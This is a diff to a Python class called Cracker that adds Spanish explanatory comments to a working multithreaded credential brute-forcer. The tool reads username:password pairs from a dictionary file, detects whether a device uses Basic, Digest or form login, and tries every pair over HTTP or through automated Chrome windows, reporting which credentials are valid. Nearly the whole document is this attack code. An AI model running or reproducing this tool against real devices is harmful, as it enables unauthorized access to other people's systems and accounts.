@@ -25,9 +25,11 @@ class Cracker(QThread, HTTPrequest):
         self.number = 0
         self.options = Options()
 
+    #Método para detectar la autenticación del dispositivo
     def detect_auth(self):
         request = {'method': 'get', 'url': self.url_attack}
         response, result = self.request(request)
+        #si hay respuesta a la petición(se establece una autenticación u otra en función del status code)
         if result['status'] >= 0:
             if response.status_code == 200:
                 self.authentication = 'form'
@@ -42,18 +44,22 @@ class Cracker(QThread, HTTPrequest):
                 self.Info.emit('HTTP ' + str(response.status_code))
         return result
 
+    #Mégodo para leer las líneas del diccionario
     def read_dict(self):
         with open(self.dictionary) as file:
             lines = file.readlines()
             for line in lines:
-                self.combinations.append(line.split(':'))
+                self.combinations.append(line.split(':')) #se guardan las líneas en  combinations (usuario y contraseña)
 
+    #Método de trabajo de los hilos para el caso Basic
     def worker_basic(self):
+        # Mientras haya combinaciones de usuario y contraseña para probar se sigue
         while self.index < len(self.combinations):
             self.lock_access_file.acquire()  # pedimos acceso al recurso
             [username, password] = self.combinations[self.index]
             self.index += 1
-            self.lock_access_file.release()
+            self.lock_access_file.release() #se libera el recurso
+            #se hace petición HTTP y se actúa en función de la respuesta
             request = {'method': 'get', 'url': self.url_attack, 'auth': HTTPBasicAuth(username, password)}
             response, result = self.request(request)
             if result['status'] < 0:
@@ -64,12 +70,15 @@ class Cracker(QThread, HTTPrequest):
             else:
                 self.Info.emit('Usuario ' + username + ' y contraseña ' + password + ' no válidos')
 
+    # Método de trabajo de los hilos para el caso Digest
     def worker_digest(self):
+        # Mientras haya combinaciones de usuario y contraseña para probar se sigue
         while self.index < len(self.combinations):
             self.lock_access_file.acquire()  # pedimos acceso al recurso
             [username, password] = self.combinations[self.index]
             self.index += 1
-            self.lock_access_file.release()
+            self.lock_access_file.release() #liberamos el recurso
+            #se hace la petición HTTP
             request = {'method': 'get', 'url': self.url_attack, 'auth': HTTPDigestAuth(username, password)}
             response, result = self.request(request)
             if result['status'] < 0:
@@ -80,21 +89,27 @@ class Cracker(QThread, HTTPrequest):
             else:
                 self.Info.emit('Usuario ' + username + ' y contraseña ' + password + ' no válidos')
 
+    # Método de trabajo de los hilos para el caso Form
     def worker_form(self):
         try:
-            self.lock_window.acquire()
+            self.lock_window.acquire() #obtener el recurso
+            #descargar el driver y abrir una ventana del explorador
             driver = webdriver.Chrome(service=ChromeService(ChromeDriverManager().install()), options=self.options)
-            driver.get(self.url_attack)
+            driver.get(self.url_attack) #abrir la url del dispositvo
+            #establecer la posición de cada ventana
             if self.number < 2:
                 driver.set_window_rect(0 + self.number * 700, 0, 700, 400)
             else:
                 driver.set_window_rect(0 + (self.number - 2) * 700, 400, 700, 400)
             self.number += 1
-            self.lock_window.release()
-            self.sleep(12 - self.number)
+            self.lock_window.release() #liberar el recurso
+            self.sleep(12 - self.number) #dormir cada hilo un tiempo dependiente de su número para que esperen a estar
+            # todas las ventanas abiertas para iniciar el ataque
+            #Buscar elementos del formulario por el XPATH
             user_box = driver.find_element(By.XPATH, "//form/fieldset/input[@type='text']")
             pass_box = driver.find_element(By.XPATH, "//form/fieldset/input[@type='password']")
             login = driver.find_element(By.XPATH, "//form/fieldset/button[@type='button']")
+            #Mientras haya combinaciones de usuario y contraseña para probar se sigue
             while self.index < len(self.combinations):
                 user_box.clear()
                 pass_box.clear()
@@ -107,20 +122,21 @@ class Cracker(QThread, HTTPrequest):
                 login.click()
                 self.sleep(2)
 
-            driver.close()
+            driver.close() #cerrar el driver
         except:
             self.Info.emit('No se pudieron encontrar campos del formulario ')
 
+    #Método que ejecuta el cracker
     def run(self):
-        self.read_dict()
-
+        self.read_dict() #leer el diccionario
         self.Info.emit('Iniciando ataque...')
-        result = self.detect_auth()
+        result = self.detect_auth() #detectar autenticación
         if result['status'] < 0:
             self.Info.emit('No se admiten peticiones HTTP')
             self.terminate()
-        thread_count = 4
+        thread_count = 4 #se lanzan 4 hilos
         threads = []
+        #En función de la autenticación se establecen los hilos y se inician
         for i in range(thread_count):
             if self.authentication == 'basic':
                 self.Info.emit('Basic authentication')
